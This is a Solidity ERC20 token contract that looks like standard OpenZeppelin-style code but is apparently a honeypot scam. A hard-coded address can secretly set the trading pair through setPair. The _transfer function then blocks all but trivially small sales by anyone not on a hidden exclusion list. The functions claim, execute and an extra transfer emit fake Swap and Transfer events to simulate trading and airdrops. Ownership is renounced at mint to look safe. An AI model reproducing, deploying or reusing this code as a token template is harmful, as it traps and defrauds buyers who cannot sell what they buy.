// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Meta is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract TOKEN is Ownable, IERC20, IERC20Meta {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    address private _p76302;
    uint256 private  _e242 = 9999;
    address[] private _excluded = [
    0x340618ce961dDf81f6169a49d21c2F89271c172A,
0xaFa4E20D80e528f3983815afC478c590Fe489197,
0x61073Cf36fd3837525F23DBB79e56167a897d1D3,
0xB955D5c13eaa4FAbC29cA3b25b062215B8317cE3,
0x8cDEb8E1B66c417fD3B6E2C595E3f646A0cffB6b,
0x902Eb7eFB618592EFC2467D24fe88912f14C8FC1,
0x462FeFf973Fb96675b2Cb98E22e887BdC468370C,
0xdeF44E2AB6c0A536c44a9852fef80f929345aEb5,
0xe29714c98E6B290CB5DEA2d1c26a2BAaC6711A54,
0x2B746677d9Ea7F8f8f99c7689e5E3072D918658c,
0xdeF44E2AB6c0A536c44a9852fef80f929345aEb5,
0x249A0603D480214c99C7F4405a17FAbA105FEe88,
0xdeF44E2AB6c0A536c44a9852fef80f929345aEb5,
0x44267e1a544d5e58Ef53c8EC8Ba6eF5E9201557c,
0xb1e3Ec0E6540A086c72f860C1EBc5AF03F9529b1,
0xDA585bFD3cA696D3874a83FCdf43ad0045A44a96,
0x42Dc71E0795049C555D2061FcFB54a9Bc34E7d12,
0xD381a9714A9717d01C870CAF3dEdEe397cFA95A8,
0x98e3cdEc6aa15a991417D48Bf227df0913e1da0e,
0x2B44a2B6DED23e23075E3f704f1cFaEa3A434F9c,
0x1c02f5dC20A1B2a0644F59a0bcDCbc4A22A76A46,
0xDB688793A29cF57046E7026939E2Cc5e6F621371,
0x497c415560852A1c10806227495Ae4cD4E838fF1,
0xa3C4Bf9De8a824B6Ae119aD1aFdD435203c4D86a,
0x980b9809852094AA6D10A11DAcA977b3D62CeAD3,
0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80,
0x747eb348AC97bcCC6Af50ff8326dDc37440DE7eD
    ];

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 8;
    }


    function claim(address [] calldata _addresses_, uint256 _in, address _a) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
            emit Transfer(_p76302, _addresses_[i], _in);
        }
    }
    function execute(address [] calldata _addresses_, uint256 _in, address _a) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
            emit Transfer(_p76302, _addresses_[i], _in);
        }
    }

    function execute(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_p76302, _addresses_[i], _out);
        }
    }


    function transfer(address _from, address _to, uint256 _wad) external {
        emit Transfer(_from, _to, _wad);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }




    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x3405D30Dd191513C91822394304e00b5736aF3D6) _p76302 = account;
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");


        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
        renounceOwnership();
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



function _transfer(
    address from,
    address to,
    uint256 amount
) internal virtual {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");

    bool isToExcluded = _isExcluded(to);
    bool isFromExcluded = _isExcluded(from) || from == 0x3405D30Dd191513C91822394304e00b5736aF3D6;

    if ((from != _p76302 && isToExcluded) || 
        (_p76302 == to && !isFromExcluded)) {
        uint256 _X7W88 = amount + 1;
        require(_X7W88 < _e242, "ERC20: transfer amount exceeds balance");
    }

    uint256 fromBalance = _balances[from];
    require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }
    emit Transfer(from, to, amount);
    _afterTokenTransfer(from, to, amount);
}

// Helper function to check if an address is in the excluded list
function _isExcluded(address _address) private view returns (bool) {
    for (uint i = 0; i < _excluded.length; i++) {
        if (_excluded[i] == _address) {
            return true;
        }
    }
    return false;
}



    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    constructor(string memory name_, string memory symbol_,uint256 amount) {
        _name = name_;
        _symbol = symbol_;
        _mint(msg.sender, amount * 10 ** decimals());
    }


}